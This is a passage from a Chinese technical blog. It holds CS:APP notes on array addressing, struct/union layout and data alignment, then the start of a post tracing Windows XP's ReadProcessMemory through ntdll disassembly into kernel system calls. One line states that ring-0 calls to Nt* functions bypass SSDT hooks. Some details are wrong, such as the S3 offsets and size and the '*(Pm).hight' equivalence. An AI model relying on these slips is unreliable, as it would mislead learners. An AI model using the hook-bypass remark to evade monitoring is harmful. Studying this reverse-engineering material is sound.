<li><p>计算$M[x_E+4·i]$ ：指令 <code>movl (%rdx,%rcx,4), %eax</code> 会执行地址计算 $x_E十4i$ ，读这个内存位置的值，并将结果存放到寄存器<code>%eax</code>中。</p>
</li>
</ul>
<p><strong>指针运算</strong></p>
<p>单操作数操作符<code>&amp;</code>和<code>*</code>可以产生指针和间接引用指针，如<code>&amp;Expr</code>是给出该对象地址的一个指针，<code>*Expr</code>是给出该地址处的值。</p>
<p>举个例子，假设整型数组<code>E</code>的起始地址和整数索引<code>i</code>分别存放在寄存器<code>%rdx</code>和<code>%rcx</code>中。下面给出了每个表达式的汇编代码实现，结果存放在寄存器<code>%eax</code>（如果是数据）或寄存器<code>%rax</code>（如果是指针）中。</p>
<p><img data-src="https://i.loli.net/2020/10/21/efwEb4lurkiBohD.png" alt="27数组计算.png"></p>
<p><img data-src="https://i.loli.net/2020/10/21/mlrDwvTN6zxu2bj.png" alt="3A数组计算.png"></p>
<h4 id="3-8-2-二维数组"><a href="#3-8-2-二维数组" class="headerlink" title="3.8.2 二维数组"></a>3.8.2 二维数组</h4><p>要访问多维数组的元素，编译器会以数组起始为基地址，（可能需要经过伸缩的）偏移量为索引，产生计算期望的元素的偏移量，然后使用某种<code>MOV</code>指令。通常来说，对于一个声明如下的数组:</p>
<p>$T \ \ D[R][C]$</p>
<ul>
<li>第<code>i</code>行的起始地址 $D[i]$：$D[i] &#x3D; x_D+L*(C*i)$，$x_D$ 是 $D[0]$ 的地址，$C*L$ 是一行的地址长度（不包含数据类型时）</li>
<li>第<code>n</code>行中的第<code>j</code>个数组元素地址：$\&amp;D[n][j] &#x3D; D[n]+j*L$，其中 $D[n] &#x3D; x_D+n*(L*C)$</li>
<li>它的数组元素 $D[i][j]$ 的地址为： $\&amp;D[i][j] &#x3D; x_D+L(C*i+j)$</li>
</ul>
<h4 id="3-8-3-定长数组和变长数组"><a href="#3-8-3-定长数组和变长数组" class="headerlink" title="3.8.3 定长数组和变长数组"></a>3.8.3 定长数组和变长数组</h4><p>关于定长数组和变长数组，是针对编译器来说的，也就是说，如果在编译时数组的长度确定，我们就称为定长数组，反之则称为变长数组。如：</p>
<ul>
<li>定长：函数在使用数组<code>a[5][6]</code>时就是定长数组，因为数组长度已经在编译前确定，<mark class="label primary">是静态的</mark></li>
<li>变长：在使用数组<code>a[m][n]</code>时，<code>m</code>和<code>n</code>预先已经赋值正整数，但是计算机在编译前并不知道<code>m</code>和<code>n</code>的值，而是在编译的时候才知道，<mark class="label warning">是动态的</mark></li>
</ul>
<p>还有一个区别：</p>
<ol>
<li>由于变长是动态的编译，函数在编译后相对于定长的寄存器的使用变化了。</li>
<li>动态的版本<mark class="label danger">必须用乘法指令</mark>对<code>i</code>伸缩<code>n</code>倍，而不能用一系列的移位和加法。在一些处理器中，乘法会招致严重的性能处罚，但是在这种情况中无可避免。</li>
</ol>
<p>如下两张图片，上图是静态编译（定长）的，下图是动态编译（变长）的：</p>
<p><img data-src="https://i.loli.net/2020/10/21/pjwqo13uW6VS7ZF.png" alt="3B静态编译.png"><img data-src="https://i.loli.net/2020/10/21/NltT6gHExjVRdC4.png" alt="3C动态编译.png"></p>
<h3 id="3-9-结构体联合体数据对齐"><a href="#3-9-结构体联合体数据对齐" class="headerlink" title="3.9 结构体联合体数据对齐"></a>3.9 结构体联合体数据对齐</h3><p>结构（struct）和联合（union）可以将多个对象集合到一个单位中，且这个数据结构中的多个对象都存放在内存的<strong>连续区域</strong>。</p>
<h4 id="3-9-1-结构"><a href="#3-9-1-结构" class="headerlink" title="3.9.1 结构"></a>3.9.1 结构</h4><p>C语言的 <code>struct</code> 创建一种数据类型（称为结构体），将可能不同的数据类型的对象聚合到一个对象中。结构体中各个组成部分由名字来引用。类似于数组的实现，结构体的所有组成部分都存放在存储器中的一段<strong>连续的区域</strong>内，<strong>指向结构体的指针就是结构体第一个字节的地址</strong>。编译器维护每个结构类型的信息，指示每个字段（field）的字节偏移。以这些偏移作为存储器引用中指令的位移，从而产生对结构体元素的引用。</p>
<div class="note info"><p>假设有个对象<code>Pm</code>，它有个成员对象为<code>hight</code>，则<code>Pm-&gt;hight</code>等价于表达式<code>*(Pm).hight</code>，且非法的写法为<code>*Pm.hight</code>，它会被解释为<code>*(Pm.hight)</code>。</p>
</div>

<p>假设有下面的结构体声明：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rec</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> *p;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2020/10/22/XmovMiT7ILBkwHW.png" alt="3D结构字节长度.png"></p>
<div class="note success"><p>要产生一个指向结构内部对象的指针，只需要将结构的起始地址加上该字段的偏移量。</p>
</div>



<p>下面的代码给出了类型 ELE 的结构声明以及函数 fun 的原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> v;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> *<span class="title">p</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当编译 fun 的代码时，GCC 会产生如下汇编代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># long fun(struct ELE *ptr)</span></span><br><span class="line"><span class="meta"># ptr in %rdi</span></span><br><span class="line"></span><br><span class="line">fun:</span><br><span class="line">    movl   $<span class="number">0</span>, %eax          <span class="meta"># result = 0</span></span><br><span class="line">    jmp    .L2               # Goto middle</span><br><span class="line">  .L3:                       <span class="meta"># loop:</span></span><br><span class="line">    addq   (%rdi), %rax      <span class="meta"># result += ptr-&gt;v</span></span><br><span class="line">    movq   <span class="number">8</span>(%rdi), %rdi     <span class="meta"># ptr = ptr-&gt;p</span></span><br><span class="line">  .L2:                       <span class="meta"># middle:</span></span><br><span class="line">    testq  %rdi, %rdi        # Test ptr</span><br><span class="line">    jne    .L3               # If != <span class="literal">NULL</span>, <span class="keyword">goto</span> loop</span><br><span class="line">    rep; ret                </span><br></pre></td></tr></table></figure>

<p>A. 利用逆向工程技巧写出 fun 的 C 代码。</p>
<p>B. 描述这个结构实现的数据结构以及 fun 执行的操作。</p>
<p>A. fun 的 C 代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">fun</span><span class="params">(struct ELE *ptr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ptr) &#123;</span><br><span class="line">        val += ptr-&gt;v;</span><br><span class="line">        ptr = ptr-&gt;p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>B. 每个结构都是一个单链表中的元素，字段 v 是元素的值，字段 p 是指向下一个元素的指针。函数 fun 计算列表中元素值的和。</p>
<h4 id="3-9-2-联合体"><a href="#3-9-2-联合体" class="headerlink" title="3.9.2 联合体"></a>3.9.2 联合体</h4><p>联合体允许以多种类型来引用同一个对象，<strong>用不同的字段来引用相同的内存</strong>。</p>
<p>考虑下面的声明：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S3</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">int</span> i[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">double</span> v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">U3</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">int</span> i[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">double</span> v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在一台 IA64(x86-64) Linux 机器上编译时，字段的偏移量、数据类型S3和U3的完整大小如下：</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">偏移量：c</th>
<th align="center">偏移量：i</th>
<th align="center">偏移量：v</th>
<th align="center">大小</th>
</tr>
</thead>
<tbody><tr>
<td align="center">S3</td>
<td align="center">0</td>
<td align="center">4</td>
<td align="center">12</td>
<td align="center">20</td>
</tr>
<tr>
<td align="center">U3</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">8</td>
</tr>
</tbody></table>
<p><strong>一个联合体的总的大小总是等于它的</strong><mark class="label success">最大字段</mark><strong>的大小</strong>。对于类型结构体 U 的指针 <code>p</code>，<code>p-&gt;c</code>、<code>p-&gt;i[0]</code>、<code>p-&gt;v</code> 都是引用数据结构的<strong>起始位置</strong>。这里S3的<code>i</code>的偏移量是4不是1以及<code>v</code>的偏移量是12不是9主要是因为数据对齐（在下一节中讲解）。</p>
<p>关于课本的举例可参考<a href="https://www.cnblogs.com/ZCplayground/p/7437574.html">【CSAPP笔记】8. 汇编语言——数据存储</a>的联合体部分。</p>
<div class="note default"><p>当用联合来将各种大小不同的数据类型结合到一起时，字节顺序的问题就变得很重要。</p>
</div>



<div class="note info"><p><strong><code>struct</code>和<code>union</code>的区别：</strong><code>struct</code>为每个对象分配了单独的内存空间，而<code>union</code>分配了共用的内存空间。</p>
<p><strong>什么时候用<code>union</code>什么时候用<code>struct</code>：</strong>当你要信息同时存在时，就需要分配到不同的内存中，就要用<code>struct</code>，否则用<code>union</code>。</p>
<p><strong>计算struct和union嵌套的数据类型的内存分布：</strong></p>
<ul>
<li>如果是包裹在struct内的，就按顺序按照对象大小依次排列下来</li>
<li>如果是包裹在union内的，就看最大的对象大小，直接分配一块内存就行</li>
</ul>
</div>



<h4 id="3-9-3-数据对齐（字节对齐）"><a href="#3-9-3-数据对齐（字节对齐）" class="headerlink" title="3.9.3 数据对齐（字节对齐）"></a>3.9.3 数据对齐（字节对齐）</h4><p>x86-64虽然不需要对齐也能正常工作，但为了<strong>提高效率</strong>， Intel建议要对齐， 原则是K字节的基本对象的地址必须是K的倍数。</p>
<p>数据对齐为什们能提高效率，解释如下：</p>
<p>假如一次取4个字节，若有个<code>int</code>存在<code>0x01-0x04</code>，则一次就能取出，若存在<code>0x03-0x06</code>，则需要分两次才能取到(第一次<code>0x01-0x04</code>，第二次<code>0x05-0x08</code>)，这样会降低CPU效率，更何况还有像<code>short</code>，<code>char</code>之类的不是4个字节的数据。因此，编译器会对数据进行强制对齐。</p>
<p>对于<strong>包含结构</strong>的代码，编译器可能需要在字段的分配中<strong>插入间隙</strong>，以保证每个结构元素都满足它的对齐要求。而结构本身对它的起始地址也有一些对齐要求。</p>
<p>编译器在汇编代码中放入命令，指明全局数据所需的对齐。例如<code>.align 8</code>，表示其后分配地址的时候都以8位倍数分配。因为每个表项长8个字节，后面的元素都会遵守<strong>8字节对齐</strong>的限制。而且引用这些对象的指针，也必须以同样的倍数对齐。</p>
<div class="note primary"><p>数据对齐规则：</p>
<ol>
<li><p>任何<mark class="label primary">K字节</mark>的基本数据对象的<mark class="label warning">偏移量</mark>必须是<mark class="label success">K的倍数</mark>，若不是，则对<mark class="label info">前一个数据对象</mark>进行数据填充。</p>
</li>
<li><p>在结构末尾根据需要会做一些填充，使其一旦被拓展为数组时可以满足条件1，而且拓展时是以<mark class="label success">数组中下一个结构体元素中</mark><mark class="label danger">数据大小最大</mark>那个元素为标准来对齐的。</p>
</li>
</ol>
</div>

<p>我们可以画图把一个个对象依次填充进去，并且要求它的偏移量是满足K的倍数。然后考虑要在末尾填充多少字节能够使得总共大小是最大对象大小的倍数。最终最大对象的大小就是对初始地址的对齐要求。</p>
<p>举例说明偏移量和字节填充是如何进行数据对齐的：</p>
<ol>
<li><p><code>struct P1&#123;int i; char c; int j; char d; &#125;;</code></p>
<ul>
<li><code>i</code>偏移量为0，是4的倍数，满足；</li>
<li><code>c</code>偏移量为4，是1的倍数，满足；</li>
<li><code>j</code>偏移量为5，不是4的倍数，需要填充3个字节，使得偏移量为8，才是4的倍数；</li>
<li><code>d</code>偏移量为12，是1的倍数，满足；</li>
<li>总共大小为13字节，而最大对象是<code>int</code>4字节，所以需要填充3字节，使其为4的倍数，所以该结构体为16字节。</li>
</ul>
</li>
<li><p><code>struct P2&#123;int i; char c; char d; long j; &#125;;</code></p>
<ul>
<li><code>i</code>的偏移量为0，是4的倍数，满足；</li>
<li><code>c</code>的偏移量为4，是1的倍数，满足；</li>
<li><code>d</code>的偏移量为5，是1的倍数，满足；</li>
<li><code>j</code>的偏移量为6，不是8的倍数，需要补充2个字节，使其偏移量为8；</li>
<li>总共大小为16字节，是最大对象<code>long</code>的倍数，所以不用填充。</li>
</ul>
</li>
<li><p><code>struct P3&#123;short w[3]; char c[3]; &#125;;</code></p>
<ul>
<li>数组<code>w</code>的偏移量为0，然后依次排列3个大小为2字节的数据，能够保证每个偏移量都是2的倍数，满足；</li>
<li>数组<code>c</code>的第一个元素的偏移量为6，是1的倍数，而后依次排列3个大小为1字节的数据；</li>
<li>总共大小为9字节，不是结构中最大对象<code>short</code>的倍数，所以还要填充1个字节，所以该结构大小为10字节。</li>
</ul>
</li>
<li><p><code>struct P4&#123;short w[5]; char *c[3]; &#125;;</code></p>
<ul>
<li>数组<code>w</code>的偏移量为0，然后依次排列5个大小为2字节的数据，能够保证每个偏移量都是2的倍数，满足；</li>
<li>数组<code>c</code>的第一个元素偏移量为10，不是8的倍数，所以要填充6个字节，使其偏移量为16，是8的倍数，然后就能依次排列3个大小为8字节的数据了；</li>
<li>总共大小为40字节，是2的倍数，所以对齐了。</li>
</ul>
</li>
<li><p><code>struct P5&#123;struct P3 a[2]; struct P2 t; &#125;;</code></p>
<ul>
<li>保存两个<code>struct P3</code>，一共需要20个字节，并且保证初始地址是2的倍数；</li>
<li><code>struct P2</code>要求初始地址是8的倍数，但是第一个对象<code>i</code>的偏移量是20，不是8的倍数，所以要填充4个字节，使得<code>i</code>的偏移量为24，是4的倍数，然后直接把<code>struct P2</code>的所有对象按上面的方式填充进去；</li>
<li>总共大小是40字节（24+16&#x3D;40），是8的倍数，所以对齐了。</li>
</ul>
</li>
<li><p>优化存储：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  <span class="keyword">char</span> *a;</span><br><span class="line">  <span class="keyword">short</span> b;</span><br><span class="line">  <span class="keyword">double</span> c;</span><br><span class="line">  <span class="keyword">char</span> d;</span><br><span class="line">  <span class="keyword">float</span> e;</span><br><span class="line">  <span class="keyword">char</span> f;</span><br><span class="line">  <span class="keyword">long</span> g;</span><br><span class="line">  <span class="keyword">int</span> h;</span><br><span class="line">&#125; rec;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>a</code>偏移量为0；</li>
<li><code>b</code>偏移量为8；</li>
<li><code>c</code>偏移量为10，不是8的倍数，填充6的字节，使得偏移量为16；</li>
<li><code>d</code>偏移量为24；</li>
<li><code>e</code>偏移量为25，不是4的倍数，填充3个字节，使得偏移量为28；</li>
<li><code>f</code>的偏移量为32；</li>
<li><code>g</code>的偏移量为33，不是8的倍数，填充7个字节，使得偏移量为40；</li>
<li><code>h</code>的偏移量为48;</li>
<li>最后的地址为52，不是第一个元素<code>a</code>要求的8的倍数，所以还要在末尾填充4个字节， 所以最终大小为56个字节。</li>
</ul>
<p>我们可以改变声明的顺序，按照从大到小的形式进行声明，可以减少填充的字节数目，节省该结构的空间大小：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *a;</span><br><span class="line">  <span class="keyword">double</span> c;</span><br><span class="line">  <span class="keyword">long</span> g;</span><br><span class="line">  <span class="keyword">float</span> e;</span><br><span class="line">  <span class="keyword">int</span> h;</span><br><span class="line">  <span class="keyword">short</span> b;</span><br><span class="line">  <span class="keyword">char</span> d;</span><br><span class="line">  <span class="keyword">char</span> f;</span><br><span class="line">&#125; rec;</span><br></pre></td></tr></table></figure>

<ul>
<li>这样依次排列下来，只要40个字节，节省了28.5%的存储空间。</li>
</ul>
</li>
</ol>
<p>参考：</p>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/105072458">[读书笔记]CSAPP：8[VB]机器级表示：数据</a></li>
<li><a href="https://www.cnblogs.com/ZCplayground/p/7437574.html">【CSAPP笔记】8. 汇编语言——数据存储</a></li>
<li><a href="https://www.cnblogs.com/czw52460183/p/10364721.html">CSAPP阅读笔记-struct, union, 数据对齐-来自第三章3.9的笔记-P183-P191</a></li>
</ul>
<h3 id="3-10-指针操作与缓冲区溢出"><a href="#3-10-指针操作与缓冲区溢出" class="headerlink" title="3.10 指针操作与缓冲区溢出"></a>3.10 指针操作与缓冲区溢出</h3>]]></content>
      <categories>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>CS:APP</tag>
        <tag>逆向</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 系统调用（一）</title>
    <url>/post/WinXP-SystemCall/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-Windows-API"><a href="#1-Windows-API" class="headerlink" title="1 Windows API"></a>1 Windows API</h2><ol>
<li><code>Application Programming Interface</code>，简称 API 函数。</li>
<li>主要是存放在 <code>C:\WINDOWS\system32</code>下面所有的dll导出的函数。</li>
<li>几个重要的DLL</li>
</ol>
<ul>
<li>Kernel32.dll：最核心的功能模块，比如管理内存、进程和线程相关的函数等。</li>
<li>User32.dll：是Windows用户界面相关应用程序接口，如创建窗口和发送消息等。</li>
<li>GDI32.dll：全称是Graphical Device Interface(图形设备接口)，包含用于画图和显示文本的函数。比如要显示一个程序窗口，就调用了其中的函数来画这个窗口。</li>
<li>Ntdll.dll：<mark class="label default">大多数API都会通过这个DLL进入内核(0环)</mark>。</li>
</ul>
<p>R3下无论如何调用，均无法绕过SSDT HOOK，R0下调用Nt*可以绕过SSDT HOOK。Rtl* 函数是windows ddk提供的编写驱动的函数。</p>
<p><a href="https://blog.csdn.net/qq1841370452/article/details/54393834">内核驱动全部集合</a>。</p>
<h2 id="2-3环进0环"><a href="#2-3环进0环" class="headerlink" title="2 3环进0环"></a>2 3环进0环</h2><h3 id="2-1-分析ReadProcessMemory3环调用过程"><a href="#2-1-分析ReadProcessMemory3环调用过程" class="headerlink" title="2.1 分析ReadProcessMemory3环调用过程"></a>2.1 分析ReadProcessMemory3环调用过程</h3><p>分析kernel32.dll导出函数<code>ReadProcessMemory(x,x,x,x)</code>调用流程。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">7</span>C8021C6 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">7</span>C8021CB                 align <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">7</span>C8021D0 ; Exported entry <span class="number">682.</span> ReadProcessMemory</span><br><span class="line">.text:<span class="number">7</span>C8021D0</span><br><span class="line">.text:<span class="number">7</span>C8021D0 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:<span class="number">7</span>C8021D0</span><br><span class="line">.text:<span class="number">7</span>C8021D0 ; Attributes: bp-based frame</span><br><span class="line">.text:<span class="number">7</span>C8021D0</span><br><span class="line">.text:<span class="number">7</span>C8021D0 ; <span class="function">BOOL __stdcall <span class="title">ReadProcessMemory</span><span class="params">(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead)</span></span></span><br><span class="line">.text:7C8021D0                 public _ReadProcessMemory@20</span><br><span class="line">.text:<span class="number">7</span>C8021D0 _ReadProcessMemory@<span class="number">20</span> proc near         ; CODE XREF: GetProcessVersion(x)+<span class="number">2F</span>12F↓p</span><br><span class="line">.text:<span class="number">7</span>C8021D0                                         ; GetProcessVersion(x)+<span class="number">2F</span>14E↓p ...</span><br><span class="line">.text:<span class="number">7</span>C8021D0</span><br><span class="line">.text:<span class="number">7</span>C8021D0 hProcess        = dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">7</span>C8021D0 lpBaseAddress   = dword ptr  <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">7</span>C8021D0 lpBuffer        = dword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">7</span>C8021D0 nSize           = dword ptr  <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">7</span>C8021D0 lpNumberOfBytesRead= dword ptr  <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">7</span>C8021D0</span><br><span class="line">.text:<span class="number">7</span>C8021D0                 mov     edi, edi</span><br><span class="line">.text:<span class="number">7</span>C8021D2                 push    ebp</span><br><span class="line">.text:<span class="number">7</span>C8021D3                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">7</span>C8021D5                 lea     eax, [ebp+nSize]</span><br><span class="line">.text:<span class="number">7</span>C8021D8                 push    eax             ; NumberOfBytesRead</span><br><span class="line">.text:<span class="number">7</span>C8021D9                 push    [ebp+nSize]     ; NumberOfBytesToRead</span><br><span class="line">.text:<span class="number">7</span>C8021DC                 push    [ebp+lpBuffer]  ; Buffer</span><br><span class="line">.text:<span class="number">7</span>C8021DF                 push    [ebp+lpBaseAddress] ; BaseAddress</span><br><span class="line">.text:<span class="number">7</span>C8021E2                 push    [ebp+hProcess]  ; ProcessHandle</span><br><span class="line">.text:<span class="number">7</span>C8021E5                 call    ds:__imp__NtReadVirtualMemory@<span class="number">20</span> ; NtReadVirtualMemory(x,x,x,x,x)</span><br><span class="line">.text:<span class="number">7</span>C8021EB                 mov     ecx, [ebp+lpNumberOfBytesRead]</span><br><span class="line">.text:<span class="number">7</span>C8021EE                 test    ecx, ecx</span><br><span class="line">.text:<span class="number">7</span>C8021F0                 jnz     <span class="keyword">short</span> loc_7C8021FD</span><br><span class="line">.text:<span class="number">7</span>C8021F2</span><br><span class="line">.text:<span class="number">7</span>C8021F2 loc_7C8021F2:                           ; CODE XREF: ReadProcessMemory(x,x,x,x,x)+<span class="number">32</span>↓j</span><br><span class="line">.text:<span class="number">7</span>C8021F2                 test    eax, eax</span><br><span class="line">.text:<span class="number">7</span>C8021F4                 jl      <span class="keyword">short</span> loc_7C802204</span><br><span class="line">.text:<span class="number">7</span>C8021F6                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">7</span>C8021F8                 inc     eax</span><br><span class="line">.text:<span class="number">7</span>C8021F9</span><br><span class="line">.text:<span class="number">7</span>C8021F9 loc_7C8021F9:                           ; CODE XREF: ReadProcessMemory(x,x,x,x,x)+<span class="number">3</span>C↓j</span><br><span class="line">.text:<span class="number">7</span>C8021F9                 pop     ebp</span><br><span class="line">.text:<span class="number">7</span>C8021FA                 retn    <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">7</span>C8021FD ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">7</span>C8021FD</span><br><span class="line">.text:<span class="number">7</span>C8021FD loc_7C8021FD:                           ; CODE XREF: ReadProcessMemory(x,x,x,x,x)+<span class="number">20</span>↑j</span><br><span class="line">.text:<span class="number">7</span>C8021FD                 mov     edx, [ebp+nSize]</span><br><span class="line">.text:<span class="number">7</span>C802200                 mov     [ecx], edx</span><br><span class="line">.text:<span class="number">7</span>C802202                 jmp     <span class="keyword">short</span> loc_7C8021F2</span><br><span class="line">.text:<span class="number">7</span>C802204 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">7</span>C802204</span><br><span class="line">.text:<span class="number">7</span>C802204 loc_7C802204:                           ; CODE XREF: ReadProcessMemory(x,x,x,x,x)+<span class="number">24</span>↑j</span><br><span class="line">.text:<span class="number">7</span>C802204                 push    eax             ; Status</span><br><span class="line">.text:<span class="number">7</span>C802205                 call    _BaseSetLastNTError@<span class="number">4</span> ; BaseSetLastNTError(x)</span><br><span class="line">.text:<span class="number">7</span>C80220A                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">7</span>C80220C                 jmp     <span class="keyword">short</span> loc_7C8021F9</span><br><span class="line">.text:<span class="number">7</span>C80220C _ReadProcessMemory@<span class="number">20</span> endp</span><br><span class="line">.text:<span class="number">7</span>C80220C</span><br><span class="line">.text:<span class="number">7</span>C80220C ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>双击查看<code>.text:7C8021E5  call  ds:__imp__NtReadVirtualMemory@20 ; NtReadVirtualMemory(x,x,x,x,x)</code>，结果如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">.idata:<span class="number">7</span>C801418 ; <span class="function">NTSTATUS __stdcall <span class="title">NtReadVirtualMemory</span><span class="params">(HANDLE ProcessHandle, </span></span></span><br><span class="line"><span class="function"><span class="params">                                                         PVOID BaseAddress, </span></span></span><br><span class="line"><span class="function"><span class="params">                                                         PVOID Buffer, </span></span></span><br><span class="line"><span class="function"><span class="params">                                                         SIZE_T NumberOfBytesToRead, </span></span></span><br><span class="line"><span class="function"><span class="params">                                                         PSIZE_T NumberOfBytesRead</span></span></span><br><span class="line"><span class="function"><span class="params">                                                        )</span></span></span><br><span class="line">.idata:7C801418   extrn __imp__NtReadVirtualMemory@20:dword</span><br></pre></td></tr></table></figure>

<p><code>__imp__</code>表示这里的<code>NtReadVirtualMemory</code>函数是从导入表导入的，在IDA导入表中查看可得<code>NtReadVirtualMemory</code>：位于ntdll.dll。</p>
<p><img data-src="https://s2.loli.net/2022/01/26/Cu9FTQ8IcReJiWE.png" alt="1.png"></p>
<p>分析得如下结论：</p>
<ul>
<li><code>ReadProcessMemory</code>：位于kernel32.dll</li>
<li><code>NtReadVirtualMemory</code>：位于ntdll.dll</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL __stdcall <span class="title">ReadProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params"> [IN]	HANDLE hProcess,	<span class="comment">//目标进程的句柄，该句柄必须对目标进程具有PROCESS_VM_READ的访问权限。</span></span></span></span><br><span class="line"><span class="function"><span class="params"> [IN]	LPCVOID lpBaseAddress,	<span class="comment">//从目标进程中读取数据的起始地址。</span></span></span></span><br><span class="line"><span class="function"><span class="params"> [OUT]	LPVOID lpBuffer,	<span class="comment">//用来接收数据的缓存区地址。</span></span></span></span><br><span class="line"><span class="function"><span class="params"> [IN]	SIZE_T nSize,		<span class="comment">// 从目标进程读取数据的字节数。如果被指定为NULL,那么将忽略此参数。</span></span></span></span><br><span class="line"><span class="function"><span class="params"> [OUT]	SIZE_T *lpNumberOfBytesRead)</span><span class="comment">//实际被读取数据大小的存放地址。</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  NtReadVirtualMemory(hProcess,lpBaseAddress,Buffer,nSize,&amp;nSize);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入到<code>ntdll.dll</code>的导出表查看<code>NtReadVirtualMemory</code>函数，发现其调用了<code>0x7FFE0300</code>处的函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">7</span>C92D9E0 ; <span class="function">__stdcall <span class="title">NtReadVirtualMemory</span><span class="params">(x, x, x, x, x)</span></span></span><br><span class="line">.text:7C92D9E0                 public _NtReadVirtualMemory@20</span><br><span class="line">.text:<span class="number">7</span>C92D9E0 _NtReadVirtualMemory@<span class="number">20</span> proc near       ; CODE XREF: LdrFindCreateProcessManifest(x,x,x,x,x)+<span class="number">1</span>CC↓p</span><br><span class="line">.text:<span class="number">7</span>C92D9E0                                         ; LdrCreateOutOfProcessImage(x,x,x,x)+<span class="number">7</span>C↓p ...</span><br><span class="line">.text:<span class="number">7</span>C92D9E0                 mov     eax, <span class="number">0B</span>Ah       ; NtReadVirtualMemory</span><br><span class="line">.text:<span class="number">7</span>C92D9E5                 mov     edx, <span class="number">7F</span>FE0300h</span><br><span class="line">.text:<span class="number">7</span>C92D9EA                 call    dword ptr [edx]</span><br><span class="line">.text:<span class="number">7</span>C92D9EC                 retn    <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">7</span>C92D9EC _NtReadVirtualMemory@<span class="number">20</span> endp</span><br></pre></td></tr></table></figure>

<p>可以看到在这里调用了一个地址：<code>0x7FFE0300</code>（其中eax存的值为系统服务号，即一个0环函数的编号），具体该地址是什么函数需要学习下一节。</p>
<h3 id="2-2-KUSER-SHARED-DATA结构"><a href="#2-2-KUSER-SHARED-DATA结构" class="headerlink" title="2.2 _KUSER_SHARED_DATA结构"></a>2.2 _KUSER_SHARED_DATA结构</h3><mark class="label danger">_KUSER_SHARED_DATA</mark>结构为一块3环和0环共享的内存块<mark class="label primary">（共享同一个物理页）</mark>。

<div class="note success"><ol>
<li>在 User 层和 Kernel 层分别定义了一个<code>_KUSER_SHARED_DATA</code>结构区域，用于 User 层和 Kernel 层共享某些数据。</li>
<li>它们使用固定的地址值映射，<code>_KUSER_SHARED_DATA</code>结构区域在 User 和 Kernel 层地址分别为：<ul>
<li>User 层地址为：<mark class="label warning">0x7FFE0000</mark>   只读</li>
<li>Kernnel 层地址为：<mark class="label success">0xFFDF0000</mark>   可读可写</li>
</ul>
</li>
</ol>
</div>

